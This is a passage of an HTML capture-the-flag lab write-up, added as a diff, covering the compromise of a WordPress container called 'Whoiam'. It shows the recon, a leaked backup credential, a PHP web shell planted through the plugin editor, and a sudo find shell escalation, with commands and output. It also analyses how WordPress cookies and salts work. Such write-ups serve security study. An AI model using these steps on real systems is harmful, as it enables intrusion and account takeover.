@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 108 Whoiam &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Whoiam</p><h1 id="whoiam--lab-108-fácil">Whoiam — Lab 108 (Fácil)</h1>
+<p><strong>Target:</strong> <code>[net-0-6]</code> — Ubuntu 24.04.3, Apache 2.4.58, WordPress <strong>6.5.4 as shipped</strong>
+(self-updated to <strong>7.1.2</strong> mid-engagement — see §7), PHP 8.3, MariaDB on 127.0.0.1:3306.
+<strong>Active plugin:</strong> Modern Events Calendar Lite <strong>5.16.2</strong>.
+<strong>Result:</strong> <code>uid=33(www-data)</code> → <code>uid=1001(rafa)</code>. <strong>Root NOT reached</strong> — the shipped
+sudoers ladder is broken by containerisation (§5). <strong>No reward present</strong> (§6).</p>
+<p><strong>Topology.</strong> <code>auto_deploy.sh</code> was read, never run. It creates one network
+(<code>dockernetwork</code>, <code>--internal</code>, line 140) and <strong>one</strong> container (line 142). No second
+host, no macvlan, no pivot. The engagement is single-host and stayed single-host.</p>
+<hr />
+<h2 id="0-the-headline-question-does-the-wordpress-class-generalise-past-lab-90">0. The headline question: does the WordPress class generalise past lab 90?</h2>
+<p><strong>Direct answer: no — not as one class. What generalises is a measurement floor, and this
+lab proves it by failing to share lab 90's entry or its escalation.</strong></p>
+<p>Lab 90's writeup is built on a <em>plugin CVE</em>. This lab shares <strong>none</strong> of that machinery,
+and I checked each piece rather than assuming:</p>
+<table>
+<thead>
+<tr>
+<th>Lab 90 (Norc) relied on</th>
+<th>Lab 108 (Whoiam)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WP Fastest Cache 1.2.1, CVE-2023-6063 unauth SQLi</td>
+<td><strong>no SQLi anywhere</strong> — the only upload handler rejects, see §4</td>
+</tr>
+<tr>
+<td><code>hide-my-wp</code> renamed <code>/wp-login.php</code> → <code>/ghost-login</code></td>
+<td><strong>canonical paths</strong>: <code>/wp-login.php</code> → 200, <code>/wp-admin/</code> → 302</td>
+</tr>
+<tr>
+<td><code>password-protected</code> gating one vhost, <strong>second vhost</strong> disclosing the plaintext password</td>
+<td><strong>one vhost only</strong> (<code>000-default.conf</code>, single <code>DocumentRoot</code>)</td>
+</tr>
+<tr>
+<td>cron <code>eval</code> of a www-data-writable file → <code>kvzlx</code></td>
+<td><strong>no cron, no file capability</strong> (<code>getcap -r /</code> empty)</td>
+</tr>
+<tr>
+<td><code>[wordpress-session-cookie]</code> <strong>cookie as the SQLi carrier</strong></td>
+<td><strong>nothing consumes that cookie</strong> — <code>grep -rn [wordpress-session-cookie] wp-content/plugins/</code> returns <strong>zero hits</strong></td>
+</tr>
+</tbody>
+</table>
+<p>That last row is the sharpest one. In lab 90 the <code>[wordpress-session-cookie]</code> cookie was the
+injection vector because a plugin read it. In lab 108 no plugin reads it at all. So the
+lab-90 rule &quot;read the plugin PHP, find the cookie sink&quot; yields <strong>nothing</strong> here, and a
+tester porting lab 90's checklist would burn the whole budget on a sink that is absent.</p>
+<p><strong>What 108 had that 90 could not have had.</strong> Two things, both about <em>platform facts</em> rather
+than about any CVE:</p>
+<ol>
+<li><strong>The auth material is not where <code>wp-config.php</code> says it is.</strong> <code>wp-config.php:54-61</code>
+ships all eight keys and salts as the literal <code>'put your unique phrase here'</code>. Reading
+the file and concluding &quot;default salts ⇒ forgeable cookies&quot; is <strong>wrong</strong>, and I proved
+it: WordPress explicitly detects that placeholder (<code>pluggable.php:2614</code>), discards the
+constant, and falls back to random 64-char values in <code>wp_options</code> (<code>pluggable.php:2638</code>).
+My offline nonce forgery built from the placeholder was <strong>rejected</strong>. The trap is
+specific to a real installer-written install — precisely the state lab 108 ships in.</li>
+<li><strong>The cookie name is not derived from the configured site either.</strong> <code>wp-config.php:40-41</code>
+define <code>WP_HOME</code>/<code>WP_SITEURL</code> from <code>$_SERVER['SERVER_ADDR']</code>, so the stored <code>siteurl</code>
+option (<code>http://[net-0-2]</code>) is inert and <code>COOKIEHASH</code> tracks the container's interface
+IP. See §3.</li>
+</ol>
+<p><strong>Recommendation to the parent.</strong> WordPress should get a <strong>section, not a row</strong>, and the
+section should be built as <em>facts to measure on every install</em>, because those facts are
+identical every time and every one of them is answerable by reading artefacts in minutes —
+while the exploitable sink is per-lab:</p>
+<ol>
+<li>user/author enumeration, and the disagreement between surfaces;</li>
+<li>the role model, read from <code>wp_usermeta</code> (<code>wp_capabilities</code>, <code>wp_user_level</code>) and asserted
+with <code>user_can()</code>, never inferred from the username;</li>
+<li>where authentication state actually lives — the cookie name, what it signs, and which
+of the two cookies is load-bearing (§3);</li>
+<li>the <code>wp_salt()</code> fallback rule (<strong>never read salts from <code>wp-config.php</code> alone</strong>);</li>
+<li>which plugins are <em>active</em> (<code>wp_options.active_plugins</code>) and which are merely present;</li>
+<li>read the plugin/theme PHP for the sink before sending a single payload.</li>
+</ol>
+<p>Items 1–5 are a checklist; item 6 is the per-lab part that made lab 90 hard. Both this
+writeup and lab 90's are then <em>instances</em> of that section rather than two unrelated entries.</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- [net-0-6]
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+Not shown: 65534 closed tcp ports (conn-refused)
+</code></pre>
+<p><strong>What a TCP scan cannot see — measured, not assumed:</strong></p>
+<pre><code>$ cat /proc/net/udp        -&gt; (empty)
+$ cat /proc/net/udp6       -&gt; (empty)
+$ docker inspect whoiam:latest -f '{{json .Config.ExposedPorts}}'  -&gt; null
+</code></pre>
+<p>No UDP surface at all. This is the one place the standard &quot;check <code>/proc/net/udp</code>&quot; warning
+is <em>load-bearing</em> and the answer is clean. <code>ss -lntup</code> agrees: <code>127.0.0.1:3306</code> (MariaDB,
+loopback-only, unreachable remotely) and <code>0.0.0.0:80</code> (apache2, pid 24).</p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Finding</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OS</td>
+<td>Ubuntu 24.04 LTS (Noble), Linux</td>
+</tr>
+<tr>
+<td>Web</td>
+<td>Apache 2.4.58, single vhost <code>000-default.conf</code>, <code>DocumentRoot /var/www/html</code></td>
+</tr>
+<tr>
+<td>App</td>
+<td>WordPress <strong>6.5.4 shipped</strong> → self-updated to <strong>7.1.2</strong> (§7)</td>
+</tr>
+<tr>
+<td>DB</td>
+<td>MariaDB on <code>127.0.0.1:3306</code>; root uses <code>unix_socket</code> auth</td>
+</tr>
+<tr>
+<td>Plugins present</td>
+<td><code>akismet</code>, <code>hello.php</code> (Hello Dolly 1.7.2), <code>modern-events-calendar-lite</code> <strong>5.16.2</strong></td>
+</tr>
+<tr>
+<td>Plugin <strong>active</strong></td>
+<td><code>modern-events-calendar-lite</code> only (<code>wp_options.active_plugins</code>)</td>
+</tr>
+<tr>
+<td>Themes</td>
+<td><code>twentytwentyfour</code> (active), <code>twentytwentythree</code>, <code>twentytwentytwo</code></td>
+</tr>
+<tr>
+<td>Users</td>
+<td><code>erik</code> (ID 1), <code>developer</code> (ID 2) — <strong>both administrators</strong></td>
+</tr>
+<tr>
+<td>Local users</td>
+<td><code>rafa</code> (uid 1001), <code>ruben</code> (uid 1002)</td>
+</tr>
+<tr>
+<td>Privileges</td>
+<td><code>/etc/sudoers:49,51,53</code> — see §5</td>
+</tr>
+</tbody>
+</table>
+<p>Versions are from the artefacts, cross-checked between two of them:
+<code>modern-events-calendar-lite.php:7</code> (<code>* Version: 5.16.2</code>) and <code>:34</code>
+(<code>define('MEC_VERSION','5.16.2')</code>), independently corroborated by the served
+<code>readme.txt</code> (<code>Stable tag: 5.16.2</code>).</p>
+<h3 id="surfaces-tcp-does-not-show-and-the-two-that-mattered">Surfaces TCP does not show, and the two that mattered</h3>
+<table>
+<thead>
+<tr>
+<th>Surface</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/wp-json/</code></td>
+<td><strong>404</strong> — permalinks are off, so the pretty REST root does not exist</td>
+</tr>
+<tr>
+<td><code>/index.php?rest_route=/wp/v2/users</code></td>
+<td><strong>200</strong> — the REST API is fully live via <code>?rest_route=</code></td>
+</tr>
+<tr>
+<td><code>xmlrpc.php</code></td>
+<td>POST reachable (GET → 405); <code>system.listMethods</code> answered</td>
+</tr>
+<tr>
+<td><code>/backups/databaseback2may.zip</code></td>
+<td><strong>200, 241 bytes</strong> — the entry point, see F1</td>
+</tr>
+<tr>
+<td><code>/wp-content/plugins/modern-events-calendar-lite/</code></td>
+<td>200 (<code>index.php</code> stub; no autoindex listing)</td>
+</tr>
+<tr>
+<td><code>/wp-content/uploads/</code></td>
+<td>200, empty</td>
+</tr>
+<tr>
+<td>Virtual hosts</td>
+<td>none — one <code>DocumentRoot</code>, <code>ServerName</code> unset, catch-all</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="2-the-class">2. The class</h2>
+<p><strong>Entry criterion:</strong> <em>does the platform disclose an account whose credential is recoverable
+without exploiting anything?</em></p>
+<p><strong>Source that settled it:</strong> <code>/var/www/html/backups/databaseback2may.zip</code>, found by listing
+the document root rather than by guessing a path. Found after the credential route had been
+exhausted by other means (§8).</p>
+<pre><code>$ curl -o backup.zip -w &quot;%{http_code} %{size_download} %{content_type}\n&quot; \
+    http://[net-0-6]/backups/databaseback2may.zip
+200 241 application/zip
+
+$ unzip -p backup.zip 29DBMay
+| Username  |         Password        |
+|-----------|-------------------------|
+| developer | 2wmy3KrGDRD%RsA7Ty5n71L^|
+|-----------|-------------------------|
+</code></pre>
+<hr />
+<h2 id="3-where-authentication-state-actually-lives">3. Where authentication state actually lives</h2>
+<p>This is the section lab 90's writeup could not have produced, so it is measured in full.</p>
+<h3 id="31-the-cookie-name">3.1 The cookie name</h3>
+<pre><code>wp-includes/default-constants.php:252   define( 'COOKIEHASH', md5( $siteurl ) );
+wp-includes/default-constants.php:290   define( 'LOGGED_IN_COOKIE', '[wordpress-session-cookie]' . COOKIEHASH );
+</code></pre>
+<p><code>$siteurl = get_site_option('siteurl')</code>. But the stored option is <code>http://[net-0-2]</code>, and
+<code>md5('http://[net-0-2]')</code> is <strong>not</strong> the hash in use. The chain that explains it:</p>
+<pre><code>wp-config.php:40   define('WP_HOME',   'http://' . $_SERVER['SERVER_ADDR']);
+wp-config.php:41   define('WP_SITEURL','http://' . $_SERVER['SERVER_ADDR']);
+wp-includes/default-filters.php:304    add_filter( 'option_siteurl', '_config_wp_siteurl' );
+wp-includes/functions.php:4797-4801    _config_wp_siteurl(): return WP_SITEURL if defined
+</code></pre>
+<p>So the DB option is <strong>inert</strong> and the effective site URL is the server's own interface
+address. Verified by computing candidates rather than trusting one:</p>
+<pre><code>a2a379b8590d3431d7153bb3b68da0df  http://[net-0-2]      &lt;- the stored option (NOT used)
+cf3a188f6e5f5e154f4ea055d8760929  http://[net-0-6]      &lt;- matches the issued cookie
+</code></pre>
+<p>Cookie names actually observed in <code>[response-cookie-header]</code>:</p>
+<pre><code>wordpress_cf3a188f6e5f5e154f4ea055d8760929              path=/wp-admin   (auth, scheme 'auth')
+[wordpress-session-cookie]   path=/           (scheme 'logged_in')
+</code></pre>
+<p>Consequence: <strong>the authentication cookie name is bound to the host's interface IP</strong>, not to
+the configured site. Redeploy the same image on a different address and every session cookie
+is orphaned. And in a CLI/OPcache context <code>$_SERVER['SERVER_ADDR']</code> is undefined — WordPress
+logs <code>Undefined array key &quot;SERVER_ADDR&quot;</code> and derives a <em>different</em>, degenerate site URL
+(observed repeatedly in <code>/var/log/apache2/error.log</code> and on every <code>wp-load.php</code> CLI call).</p>
+<h3 id="32-what-the-cookie-signs">3.2 What the cookie signs</h3>
+<pre><code>wp-includes/pluggable.php:970-972
+    $key  = wp_hash( $user-&gt;user_login . '|' . $pass_frag . '|' . $expiration . '|' . $token, $scheme );
+    $hash = hash_hmac( 'sha256', $user-&gt;user_login . '|' . $expiration . '|' . $token, $key );
+wp-includes/pluggable.php:974
+    $cookie = $user-&gt;user_login . '|' . $expiration . '|' . $token . '|' . $hash;
+</code></pre>
+<p>Four fields: <code>user_login | expiration | session token | HMAC-SHA256</code>. Validation:</p>
+<pre><code>wp-includes/pluggable.php:867   if ( ! hash_equals( $hash, $hmac ) )      -&gt; reject
+wp-includes/pluggable.php:889   if ( ! $manager-&gt;verify( $token ) )      -&gt; reject
+</code></pre>
+<p><code>$manager-&gt;verify($token)</code> is <code>WP_Session_Tokens</code> against
+<code>wp_usermeta.session_tokens</code>. <strong>This is the load-bearing check and the reason the cookie is
+not forgeable offline</strong>: an attacker must hold a token that is actually in the target user's
+session store. No token ⇒ no login, no matter how well the HMAC is computed.</p>
+<h3 id="33-the-salt-trap--read-wp_salt-not-wp-configphp">3.3 The salt trap — read <code>wp_salt()</code>, not <code>wp-config.php</code></h3>
+<p><code>wp-config.php:54-61</code> ships all eight values as the placeholder:</p>
+<pre><code class="language-php">define( 'AUTH_KEY',  'put your unique phrase here' );
+...
+define( 'NONCE_SALT','put your unique phrase here' );   // :61
+</code></pre>
+<p>The obvious conclusion — default salts, forgeable cookies — is <strong>false</strong>, because core
+guards against exactly that mistake:</p>
+<pre><code>wp-includes/pluggable.php:2614   $duplicated_keys['put your unique phrase here'] = true;
+wp-includes/pluggable.php:2621   $duplicated_keys[ __( 'put your unique phrase here' ) ] = true;
+wp-includes/pluggable.php:2638   $options_to_prime[] = &quot;{$key}_{$second}&quot;;   // ignore the constant
+wp-includes/pluggable.php:2676   $values[$type] = get_site_option( &quot;{$scheme}_{$type}&quot; );
+</code></pre>
+<p>The effective key material lives in <strong><code>wp_options</code></strong>:</p>
+<pre><code>auth_key         0|7zjSoSy;JZnP6_G8ji+fEK&amp;Dz7U3Sx#;x;*{}4Dp/k@]SsGS9A0`$GO&gt;n-bVF]
+logged_in_key    (0?1veiN5:EdecGUi;2?_^pAb=&amp;uHcVNX#-ZTvX$C{1[xzUu*R%(2:Z8iPNo-t_X
+nonce_key        4Gj6TYoJ9W4&lt;gvGrN+V,i&lt;Adk2~]3HM,/t P#&lt;MiqvW440&amp;D)PG_})GD$JM{bA&gt;O
+</code></pre>
+<p><strong>Proof that this held, rather than an assertion:</strong> I computed a nonce <em>offline</em> in Python
+from the placeholder key material — <code>hmac_md5(tick|action|0|&quot;&quot;, NONCE_KEY+NONCE_SALT)[-12:-2]</code>
+— and posted it to <code>wp-admin/admin-ajax.php?action=mec_fes_upload_featured_image</code>.</p>
+<pre><code>NEGATIVE CONTROL  _wpnonce=deadbeef99   -&gt; {&quot;success&quot;:0,&quot;code&quot;:&quot;NONCE_IS_INVALID&quot;}
+FORGED (offline)  _wpnonce=5dc7775774   -&gt; {&quot;success&quot;:0,&quot;code&quot;:&quot;NONCE_IS_INVALID&quot;}
+</code></pre>
+<p>The control fires, so the detector works. The forgery fails, so the fallback works. Had I
+trusted <code>wp-config.php</code> I would have reported an unauthenticated upload primitive that does
+not exist.</p>
+<h3 id="34-what-[wordpress-session-cookie]-actually-proves">3.4 What <code>[wordpress-session-cookie]</code> actually proves</h3>
+<pre><code>wp-includes/user.php:598
+    return wp_validate_auth_cookie( $_COOKIE[ LOGGED_IN_COOKIE ], 'logged_in' );
+</code></pre>
+<p>It is a thin wrapper — the same validator, different key. So it grants nothing extra, and
+it is not required. Measured, with redirects disabled so the auth decision is visible
+(<code>urllib</code> follows 302→login→200 by default; see §8):</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Cookies sent</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A</td>
+<td><code>wordpress_&lt;hash&gt;</code> <strong>+</strong> <code>[wordpress-session-cookie]&lt;hash&gt;</code></td>
+<td><strong>200</strong> authenticated</td>
+</tr>
+<tr>
+<td>B</td>
+<td><strong><code>[wordpress-session-cookie]&lt;hash&gt;</code> alone</strong></td>
+<td><strong>302 → wp-login.php</strong></td>
+</tr>
+<tr>
+<td>C</td>
+<td><code>wordpress_&lt;hash&gt;</code> <strong>alone</strong></td>
+<td><strong>200</strong> authenticated</td>
+</tr>
+<tr>
+<td>D</td>
+<td>control: <code>[wordpress-session-cookie]</code> with HMAC zeroed</td>
+<td>302 → wp-login.php</td>
+</tr>
+<tr>
+<td>E</td>
+<td>control: no cookies at all</td>
+<td>302 → wp-login.php</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Answer: <code>[wordpress-session-cookie]</code> proves only that some WordPress process previously computed
+a valid HMAC over <code>user_login|expiration|token</code> with <code>wp_salt('logged_in')</code> <strong>and</strong> that the
+token was present in the session store at the moment it was validated. It authenticates
+nothing by itself (B), it is not necessary when the auth cookie is present (C), and it is
+not forgeable without the DB-stored <code>logged_in_key</code>/<code>logged_in_salt</code> plus a real token.</strong></p>
+<p>This is also why lab 90's writeup is right to treat that cookie as an <em>attack surface</em>
+rather than a <em>session</em>: there it mattered only because a plugin parsed it into SQL.</p>
+<hr />
+<h2 id="4-enumeration-the-role-model-and-what-the-plugin-actually-exposed">4. Enumeration, the role model, and what the plugin actually exposed</h2>
+<h3 id="41-author-enumeration-with-a-positive-control">4.1 Author enumeration, with a positive control</h3>
+<pre><code>?author=1     301 -&gt; http://[net-0-6]/index.php/author/erik/
+?author=2     200   body: &lt;title&gt;developer - Whoiam&lt;/title&gt;, author/developer
+?author=3     404
+?author=9999  404     &lt;- control: the 404 is real, not a blanket response
+?author=zzz   200     (ignored, falls through to the front page)
+</code></pre>
+<p>Both accounts are public: <code>erik</code> and <code>developer</code>.</p>
+<h3 id="42-the-two-surfaces-disagree--which-is-the-useful-part">4.2 The two surfaces disagree — which is the useful part</h3>
+<p>REST enumeration (<code>/index.php?rest_route=/wp/v2/users</code>) returns <strong>only <code>erik</code></strong>, because the
+endpoint lists users with published posts and <code>developer</code> has none. <code>?author=2</code> exposes
+<code>developer</code> anyway. So:</p>
+<ul>
+<li>REST alone → incomplete (misses <code>developer</code>).</li>
+<li><code>?author=N</code> sweep alone → complete, but the status code lies: ID 2 answers <strong>200</strong>, not
+301, and the login is only visible in the body title.</li>
+</ul>
+<p>Neither is sufficient alone. That disagreement is the actual finding, not the usernames.</p>
+<h3 id="43-the-login-form-is-a-user-existence-oracle">4.3 The login form is a user-existence oracle</h3>
+<pre><code>existing user   -&gt; &quot;Error: The password you entered for the username erik is incorrect.&quot;
+nonexistent     -&gt; &quot;Error: The username nosuchuser_zzz is not registered on this site.&quot;
+</code></pre>
+<p>Two byte-different error strings, unauthenticated.</p>
+<h3 id="44-role-model--asserted-not-inferred">4.4 Role model — asserted, not inferred</h3>
+<pre><code>ID 1 erik       wp_capabilities = a:1:{s:13:&quot;administrator&quot;;b:1;}   wp_user_level = 10
+ID 2 developer  wp_capabilities = a:1:{s:13:&quot;administrator&quot;;b:1;}   wp_user_level = 10
+developer: roles=administrator ; user_can(manage_options)=true
+</code></pre>
+<p><strong>Both</strong> accounts are full administrators. There is no low-privilege foothold to escalate
+<em>within</em> WordPress — the role model is flat. This matters: it means any credential compromise
+here is immediate full compromise, and it means a &quot;register a subscriber and escalate&quot;
+strategy has no surface.</p>
+<h3 id="45-the-plugin-what-it-exposes-and-why-the-known-cve-does-not-apply">4.5 The plugin: what it exposes and why the known CVE does not apply</h3>
+<p>Every <code>wp_ajax_nopriv_*</code> handler MEC 5.16.2 registers:</p>
+<pre><code>mec_booking_calendar_load_month · mec_get_ajax_search_data · mec_ajax_login_data
+speaker_adding · mec_fes_form · mec_fes_upload_featured_image
+</code></pre>
+<p>The interesting one is the unauthenticated <strong>file upload</strong> — <code>app/features/fes.php:58-59</code>
+registers <code>wp_ajax_nopriv_mec_fes_upload_featured_image</code>, which is the shape of
+CVE-2021-24145. It does not work here, for three independent reasons read from the source:</p>
+<pre><code class="language-php">// app/features/fes.php:350-353  — gate 1: nonce, keyed on the DB-random nonce_key
+if(!isset($_POST['_wpnonce'])) $this-&gt;main-&gt;response(array('success'=&gt;0,'code'=&gt;'NONCE_MISSING'));
+if(!wp_verify_nonce(sanitize_text_field($_POST['_wpnonce']), 'mec_fes_upload_featured_image'))
+    $this-&gt;main-&gt;response(array('success'=&gt;0,'code'=&gt;'NONCE_IS_INVALID'));
+
+// app/features/fes.php:363-369  — gate 2: extension allowlist (last dot-segment)
+$allowed = array('gif','jpeg','jpg','png');
+$extension = end(explode('.', $uploaded_file['name']));
+if(!in_array($extension, $allowed)) $this-&gt;main-&gt;response(...'INVALID_EXTENSION');
+
+// app/features/fes.php:377      — gate 3: core re-validates type via wp_handle_upload()
+$movefile = wp_handle_upload($uploaded_file, array('test_form'=&gt;false));
+</code></pre>
+<p><code>mec_ajax_login_data</code> (<code>app/features/login.php:35-48</code>) also calls <code>wp_signon()</code> with
+<code>remember=true</code> and would hand out a session — but it is behind the same nonce
+(<code>app/features/login.php:41</code>).</p>
+<p><strong>A hypothesis I had to refute.</strong> <code>fes_upload()</code> calls <code>$this-&gt;main-&gt;response(...)</code> on nonce
+failure <strong>without a <code>return</code></strong>, which looks like a fail-open write. Reading the callee killed it:</p>
+<pre><code class="language-php">// app/libraries/main.php:1606-1610
+public function response($response) { echo json_encode($response); exit; }
+</code></pre>
+<p><code>exit</code>. I posted two files with a bad nonce and then checked the filesystem rather than the
+status code — <code>wp-content/uploads/</code> was empty, and a <code>find</code> on it returned nothing. The
+control would have caught the opposite, which is the only reason this is worth recording.</p>
+<hr />
+<h2 id="5-chain">5. Chain</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>unauth</td>
+<td>TCP recon; <code>/proc/net/udp</code> empty</td>
+<td>—</td>
+</tr>
+<tr>
+<td>2</td>
+<td>unauth</td>
+<td><code>?author=N</code> sweep → <code>erik</code>, <code>developer</code>; REST <code>?rest_route=</code> corroborates one of them</td>
+<td><code>?author=3</code> and <code>?author=9999</code> → 404 (control)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>unauth</td>
+<td><code>GET /backups/databaseback2may.zip</code> → plaintext admin credential</td>
+<td>200, 241 bytes, extracted</td>
+</tr>
+<tr>
+<td>4</td>
+<td>unauth</td>
+<td>Credential confirmed against the stored hash</td>
+<td><code>wp_check_password(disclosed, stolen)=bool(true)</code>; wrong value <code>bool(false)</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>unauth</td>
+<td><code>POST /wp-login.php</code> as <code>developer</code></td>
+<td><code>302</code> + <code>wordpress_&lt;hash&gt;</code> + <code>[wordpress-session-cookie]&lt;hash&gt;</code>; <code>/wp-admin/</code> → <code>200</code>, <code>Howdy, developer</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>unauth</td>
+<td>Plugin editor writes a PHP payload into <code>wp-content/plugins/hello.php</code></td>
+<td>mtime <code>2024-06-08 17:14:07</code> → <code>2026-09-30 06:09:59</code>, size <code>2578</code> → <code>118</code>; bad-nonce control left mtime unchanged</td>
+</tr>
+<tr>
+<td>7</td>
+<td><strong><code>uid=33(www-data)</code></strong></td>
+<td><code>GET /wp-content/plugins/hello.php?c=id</code> — <strong>no activation needed</strong></td>
+<td><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>, <code>id -u</code> = 33</td>
+</tr>
+<tr>
+<td>8</td>
+<td><strong><code>uid=1001(rafa)</code></strong></td>
+<td><code>sudo -n -u rafa /usr/bin/find / -maxdepth 0 -exec /bin/sh -c 'id' \;</code></td>
+<td><code>uid=1001(rafa) gid=1001(rafa) groups=1001(rafa),100(users)</code>, <code>id -u</code> = 1001</td>
+</tr>
+<tr>
+<td>9</td>
+<td><strong>blocked</strong></td>
+<td>rafa → ruben via <code>sudo -n -u ruben /usr/sbin/debugfs</code></td>
+<td>see below</td>
+</tr>
+</tbody>
+</table>
+<h3 id="the-escalation-ladder-read-off-the-artefact">The escalation ladder, read off the artefact</h3>
+<pre><code>/etc/sudoers:49   www-data ALL=(rafa)  NOPASSWD: /usr/bin/find
+/etc/sudoers:51   rafa     ALL=(ruben) NOPASSWD: /usr/sbin/debugfs
+/etc/sudoers:53   ruben    ALL=(ALL)   NOPASSWD: /bin/bash /opt/penguin.sh
+</code></pre>
+<p>Confirmed with <code>sudo -l -U &lt;user&gt;</code> for all three. Step 8 is exercised <strong>over the web shell</strong>,
+not via <code>su</code>. Step 7's surprise: the payload executed <strong>as soon as it was written</strong> —
+<code>hello.php</code> is an inactive plugin, but Apache serves <code>wp-content/plugins/*.php</code> through the
+PHP handler regardless of activation state. Lab 90 had to activate its payload via REST;
+that extra step is not required here.</p>
+<h3 id="rung-9-did-not-work--its-own-finding-reported-separately">Rung 9 did not work — its own finding, reported separately</h3>
+<p><code>debugfs</code> is the classic route to a root-owned filesystem through a path the caller has no
+DAC rights to. It needs a block device. In this container there is none:</p>
+<pre><code>$ sudo -n -u ruben /usr/sbin/debugfs -w /dev/sda3 /dev/null
+debugfs 1.47.0 (5-Feb-2023)
+debugfs: No such file or directory while trying to open /dev/sda3
+
+$ ls /dev/sda*                       -&gt; No such file or directory
+$ cat /proc/partitions               -&gt; 8 0 325058560 sda / 8 1 1024 sda1 / 8 2 2097152 sda2
+$ mknod /tmp/zz b 8 3                -&gt; Operation not permitted      (no CAP_MKNOD)
+$ ls -la /usr/sbin/debugfs           -&gt; -rwxr-xr-x 1 root root       (not replaceable)
+</code></pre>
+<p>The host's <code>sda</code> is visible through <code>/sys</code> and <code>/proc/partitions</code>, but Docker did not pass
+device nodes into <code>/dev</code>. Three independent blockers, each measured. <code>/opt/penguin.sh</code>
+(the <code>ruben → root</code> rung) is unreachable for the same reason, and I did <strong>not</strong> claim it
+exploitable — I never obtained <code>ruben</code>.</p>
+<p><strong>This is a lab-design defect, not a tester failure.</strong> The sudoers file describes a three-rung
+ladder whose second rung cannot function inside the container the same image ships, and
+whose payload (<code>/opt/penguin.sh</code>) is root-owned <code>0644</code> with no writable path to it.</p>
+<hr />
+<h2 id="6-reward">6. Reward</h2>
+<p><strong>No reward exists in any location reachable by <code>www-data</code> or <code>rafa</code>.</strong> Reported as a
+measured absence, with the search:</p>
+<ul>
+<li>Name sweep for <code>flag*</code>, <code>reward*</code>, <code>*secret*</code> and <code>ctf</code> variants across the filesystem,
+as <code>rafa</code>: <strong>zero hits</strong>. Only <code>wp-includes/sodium_compat/src/Core/SecretStream</code>,
+a WordPress library directory — a name false positive, not a reward.</li>
+<li>Content sweep for <code>flag{</code>, <code>FLAG{</code>, <code>ctf{</code>, <code>CTF{</code> in files &lt; 2 MB, as <code>www-data</code>:
+<strong>two hits, both my own <code>/tmp/reward*.sh</code> scripts.</strong> No pre-existing hit anywhere.</li>
+<li><code>wp_options</code> and <code>wp_posts</code> searched for the same patterns: empty. <code>wp_mec_users</code> is empty.
+All 5 published posts are stock MEC demo events with empty bodies; the single post is
+&quot;Hello world!&quot;.</li>
+<li><code>/root</code> and <code>[lab-home]/ruben</code> are <code>drwx------ root</code> and <code>drwxr-x--- ruben</code> — both
+<code>Permission denied</code> from both identities. Not searched, and not claimed.</li>
+</ul>
+<p><strong>This is the sixteenth lab in this series without a reward.</strong> Four locations
+(<code>/root</code>, <code>[lab-home]/ruben</code>, <code>/var/lib/mysql</code>, <code>/etc/shadow</code>) remain unsearchable because
+reaching them requires <code>ruben</code> or <code>root</code>, and rung 9 is blocked.</p>
+<hr />
+<h2 id="7-the-target-modified-itself-mid-engagement">7. The target modified itself mid-engagement</h2>
+<p>This is the most operationally important thing in the writeup, and it is not a finding about
+the lab's design so much as a hazard for anyone re-running it.</p>
+<p>My first reading of the core version was <code>$wp_version = '6.5.4'</code>. About thirteen minutes
+later it read <code>7.1.2</code>. The cause:</p>
+<pre><code>$ grep -nE &quot;AUTOMATIC_UPDATER|WP_AUTO_UPDATE|DISALLOW&quot; /var/www/html/wp-config.php
+  (none set -&gt; core auto-update is ENABLED by default)
+
+$ file_get_contents(&quot;https://api.wordpress.org/core/version-check/1.7/&quot;)   # from inside the container
+  string(13967) &quot;{&quot;offers&quot;:[{&quot;response&quot;:&quot;upgrade&quot;,&quot;download&quot;:&quot;.../wordpress-7.1.2.zip&quot; ...
+</code></pre>
+<p>The container has <strong>outbound internet egress</strong> and nothing disables auto-update, so
+<code>wp-cron.php</code> (triggered by ordinary front-end requests) downloaded and applied a core
+upgrade mid-engagement. File mtimes make it unambiguous:</p>
+<pre><code>2026-09-30 06:13:55  wp-includes/version.php      &lt;- rewritten (core update)
+2026-09-30 06:13:55  wp-admin/plugin-editor.php   &lt;- rewritten (core update)
+2024-06-08 17:14:07  wp-content/plugins/hello.php &lt;- untouched
+2024-06-08 18:01:18  wp-config.php                &lt;- untouched
+</code></pre>
+<p>The image itself is clean, confirmed by reading it with the entrypoint overridden so nothing
+starts and no request is ever made:</p>
+<pre><code>$ docker run --rm --entrypoint sh whoiam:latest -c 'grep -n &quot;wp_version =&quot; /var/www/html/wp-includes/version.php'
+19:$wp_version = '6.5.4';
+</code></pre>
+<p><strong>Both numbers are correct and they mean different things: the shipped artefact is 6.5.4;
+everything from minute ~13 onward ran on 7.1.2.</strong> My chain was demonstrated on 7.1.2. It is
